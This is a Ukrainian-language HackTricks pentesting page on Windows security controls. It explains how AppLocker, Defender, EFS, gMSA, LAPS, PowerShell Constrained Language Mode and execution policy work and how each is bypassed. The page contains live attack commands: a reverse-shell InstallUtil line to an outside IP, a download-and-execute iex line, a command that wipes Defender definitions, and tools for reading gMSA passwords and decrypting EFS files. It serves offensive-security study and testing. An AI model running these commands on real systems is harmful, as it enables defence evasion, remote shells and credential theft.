# Засоби безпеки Windows

{{#include ../banners/hacktricks-training.md}}

## Політика AppLocker

Whitelist застосунків — це список схвалених програм або виконуваних файлів, яким дозволено бути присутніми в системі та запускатися в ній. Мета полягає в захисті середовища від шкідливого malware та несхваленого програмного забезпечення, яке не відповідає конкретним бізнес-потребам організації.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) — це **рішення Microsoft для whitelist застосунків**, яке надає системним адміністраторам контроль над тим, **які застосунки та файли можуть запускати користувачі**. Воно забезпечує **детальний контроль** над виконуваними файлами, скриптами, файлами інсталятора Windows, DLL, packaged apps і packed app installers.\
Для організацій є типовим **блокувати cmd.exe і PowerShell.exe**, а також доступ на запис до певних каталогів, **але все це можна обійти**.

### Перевірка

Перевірте, які файли/розширення внесені до чорного/білого списку:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
`Test-AppLockerPolicy` оцінює файли-кандидати для певної особи відповідно до політики AppLocker. Перевіряйте обліковий запис, токен якого виконуватиме payload, оскільки правила можуть застосовуватися до користувачів або груп; `Get-AppLockerFileInformation` також корисний для перевірки шляху, хешу та метаданих видавця, за якими правила можуть зіставлятися.<sup>[[5]](#references)</sup>
```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```
Цей шлях реєстру містить конфігурації та політики, застосовані AppLocker, що дає змогу переглянути поточний набір правил, enforced у системі:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Обхід

- Корисні **доступні для запису папки** для обходу політики AppLocker: якщо AppLocker дозволяє виконувати будь-що всередині `C:\Windows\System32` або `C:\Windows`, існують **доступні для запису папки**, які можна використати, щоб **обійти це**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Загальновідомі **trusted** бінарні файли [**"LOLBAS's"**](https://lolbas-project.github.io/) також можуть бути корисними для обходу AppLocker.
- **Погано написані правила також можна обійти**
- Наприклад, для **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** можна створити **папку з назвою `allowed`** будь-де, і вона буде дозволена.
- Організації також часто зосереджуються на **блокуванні виконуваного файлу `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, але забувають про **інші** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), наприклад `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` або `PowerShell_ISE.exe`.
- **Застосування правил для DLL дуже рідко вмикають** через додаткове навантаження, яке це може створити для системи, а також через значний обсяг тестування, необхідного для гарантування, що нічого не зламається. Тому використання **DLL як бекдорів допоможе обійти AppLocker**.
- Ви можете використовувати [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), щоб **виконувати код Powershell** у будь-якому процесі та обходити AppLocker. Додаткову інформацію див. тут: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Зберігання облікових даних

### Security Accounts Manager (SAM)

Локальні облікові дані містяться у цьому файлі, а паролі хешовані.

### Local Security Authority (LSA) - LSASS

**Облікові дані** (хешовані) **зберігаються** в **пам'яті** цієї підсистеми для Single Sign-On.\
**LSA** керує локальною **політикою безпеки** (політикою паролів, дозволами користувачів...), **автентифікацією**, **токенами доступу**...\
LSA перевіряє **надані облікові дані** у файлі **SAM** (для локального входу) та взаємодіє з **контролером домену**, щоб автентифікувати користувача домену.

**Облікові дані** **зберігаються** всередині **процесу LSASS**: квитки Kerberos, хеші NT і LM, паролі, які можна легко розшифрувати.

### Секрети LSA

LSA може зберігати на диску деякі облікові дані:

- Пароль облікового запису комп'ютера Active Directory (якщо контролер домену недоступний).
- Паролі облікових записів служб Windows
- Паролі для запланованих завдань
- Інше (пароль застосунків IIS...)

### NTDS.dit

Це база даних Active Directory. Вона присутня лише на контролерах домену.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) — це Antivirus, доступний у Windows 10 і Windows 11, а також у версіях Windows Server. Він **блокує** поширені інструменти pentesting, такі як **`WinPEAS`**. Однак існують способи **обійти ці засоби захисту**.

### Перевірка

Щоб перевірити **стан** **Defender**, можна виконати PS cmdlet **`Get-MpComputerStatus`** (перевірте значення **`RealTimeProtectionEnabled`**, щоб дізнатися, чи він активний):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Щоб також отримати його перелік, можна виконати:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Зашифрована файлова система (EFS)

EFS захищає файли за допомогою шифрування, використовуючи **симетричний ключ**, відомий як **ключ шифрування файлу (FEK)**. Цей ключ шифрується за допомогою **відкритого ключа** користувача та зберігається в **альтернативному потоці даних** $EFS зашифрованого файлу. Коли потрібно виконати розшифрування, відповідний **закритий ключ** цифрового сертифіката користувача використовується для розшифрування FEK із потоку $EFS. Докладнішу інформацію можна знайти [тут](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Сценарії розшифрування без ініціації користувача** включають:

- Коли файли або папки переміщуються до файлової системи, яка не підтримує EFS, наприклад [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), вони автоматично розшифровуються.
- Зашифровані файли, надіслані мережею через протокол SMB/CIFS, розшифровуються перед передаванням.

Цей метод шифрування забезпечує **прозорий доступ** власника до зашифрованих файлів. Однак проста зміна пароля власника та вхід до системи не дасть змоги виконати розшифрування.

**Основні висновки**:

- EFS використовує симетричний FEK, зашифрований відкритим ключем користувача.
- Для доступу до FEK під час розшифрування використовується закритий ключ користувача.
- Автоматичне розшифрування відбувається за певних умов, наприклад під час копіювання до FAT32 або передавання мережею.
- Власник може отримувати доступ до зашифрованих файлів без додаткових дій.

### Перевірка інформації EFS

Перевірте, чи **користувач** **використовував** цю **службу**, перевіривши наявність цього шляху:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Перевірте, **хто** має **доступ** до файлу, за допомогою cipher /c \<file>\
Також можна використовувати `cipher /e` і `cipher /d` у папці, щоб **зашифрувати** та **розшифрувати** всі файли

### Розшифрування файлів EFS

#### Працюючи як Authority System

Цей підхід вимагає, щоб **користувач-жертва** **запустив** **процес** на хості. Якщо це так, із сеансу `meterpreter` можна видати себе за токен процесу користувача (`impersonate_token` з `incognito`). Як альтернативний варіант, можна виконати `migrate` до процесу користувача.

#### Знаючи пароль користувача

Mimikatz може імпортувати сертифікат і закритий ключ користувача, а потім використовувати їх для розшифрування файлів, захищених EFS.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Групові керовані службові облікові записи (gMSA)

Microsoft розробила **Group Managed Service Accounts (gMSA)**, щоб спростити керування службовими обліковими записами в IT-інфраструктурах. На відміну від традиційних службових облікових записів, для яких часто ввімкнено параметр "**Password never expire**", gMSA забезпечують безпечніше рішення, яким простіше керувати:

- **Автоматичне керування паролями**: gMSA використовують складний пароль довжиною 240 символів, який автоматично змінюється відповідно до політики домену або комп’ютера. Цей процес обробляється Key Distribution Service (KDC) від Microsoft, що усуває потребу в ручному оновленні паролів.
- **Підвищена безпека**: ці облікові записи не блокуються та не можуть використовуватися для інтерактивного входу, що підвищує їхню безпеку.
- **Підтримка кількох хостів**: gMSA можна спільно використовувати на кількох хостах, що робить їх ідеальними для служб, які працюють на кількох серверах.
- **Підтримка запланованих завдань**: на відміну від керованих службових облікових записів, gMSA підтримують запуск запланованих завдань.
- **Спрощене керування SPN**: система автоматично оновлює Service Principal Name (SPN), коли змінюються відомості sAMaccount або DNS-ім’я комп’ютера, що спрощує керування SPN.

Паролі gMSA зберігаються у властивості LDAP _**msDS-ManagedPassword**_ і автоматично скидаються кожні 30 днів контролерами домену (DC). Цей пароль, зашифрований двійковий об’єкт даних, відомий як [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), можуть отримати лише авторизовані адміністратори та сервери, на яких інстальовано gMSA, що забезпечує безпечне середовище. Для доступу до цієї інформації потрібне захищене з’єднання, наприклад LDAPS, або з’єднання має бути автентифіковане за допомогою 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Цей пароль можна прочитати за допомогою [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Більше інформації в цьому дописі**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Також перегляньте цю [вебсторінку](https://cube0x0.github.io/Relaying-for-gMSA/) про те, як виконати **NTLM relay attack**, щоб **прочитати** **пароль** **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Під час enumeration розрізняйте **legacy Microsoft LAPS** та вбудовану реалізацію **Windows LAPS**. Windows LAPS постачався в оновленнях Windows від 11 квітня 2023 року та може зберігати пароль керованого локального адміністратора в **Windows Server Active Directory** або **Microsoft Entra ID**. У розгортаннях на базі AD він також може шифрувати паролі, зберігати історію зашифрованих паролів і керувати паролем DSRM контролера домену. Завантажуваний legacy MSI застарів у новіших версіях Windows, хоча Windows LAPS може працювати в режимі емуляції legacy.<sup>[[6]](#references)</sup>

Оскільки legacy Microsoft LAPS і Windows LAPS є окремими реалізаціями, перед застосуванням атак, специфічних для атрибутів або cmdlet, визначте, яка саме з них розгорнута. Пов’язана сторінка охоплює виявлення, enumeration ACL, отримання, зміну терміну дії та offline recovery без дублювання цих процедур тут.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **блокує багато функцій**, необхідних для ефективного використання PowerShell, зокрема блокує COM-об’єкти, дозволяє використовувати лише схвалені типи .NET, робочі процеси на основі XAML, класи PowerShell тощо.

### **Перевірка**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Обхід
```bash
#Easy bypass
Powershell -version 2
```
У сучасних версіях Windows цей Bypass не працюватиме, але ви можете використати [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Для його компіляції вам може знадобитися** **додати** _**посилання**_ -> _Огляд_ ->_Огляд_ -> додати `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` і **змінити проєкт на .Net4.5**.

#### Прямий bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Ви можете використовувати [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), щоб **виконувати** код Powershell у будь-якому процесі та обходити constrained mode. Докладніше дивіться: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Політика виконання PS

За замовчуванням встановлено значення **restricted.** Основні способи обходу цієї політики:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Більше інформації можна знайти [тут](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

Це API, який можна використовувати для автентифікації користувачів.

SSPI відповідатиме за пошук відповідного протоколу для двох машин, які хочуть встановити зв’язок. Бажаним методом для цього є Kerberos. Потім SSPI узгодить, який протокол автентифікації буде використано. Ці протоколи автентифікації називаються Security Support Provider (SSP), розташовані всередині кожної Windows-машини у формі DLL, і обидві машини повинні підтримувати один і той самий протокол, щоб мати змогу обмінюватися даними.

### Main SSPs

- **Kerberos**: Бажаний варіант
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** та **NTLMv2**: З міркувань сумісності
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Вебсервери та LDAP, пароль у формі MD5-хешу
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL та TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Використовується для узгодження протоколу, який буде застосовано (Kerberos або NTLM, причому Kerberos використовується за замовчуванням)
- %windir%\Windows\System32\lsasrv.dll

#### У результаті узгодження може бути запропоновано кілька методів або лише один.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) — це функція, яка забезпечує **запит на підтвердження для дій із підвищеними привілеями**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}



## References

- [1] [Обхід AppLocker і режиму constrained language у PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [howto ~ розшифрувати файли EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Ретрансляція для gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 способів обійти PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Використання командлетів AppLocker для Windows PowerShell](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Огляд Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
{{#include ../banners/hacktricks-training.md}}
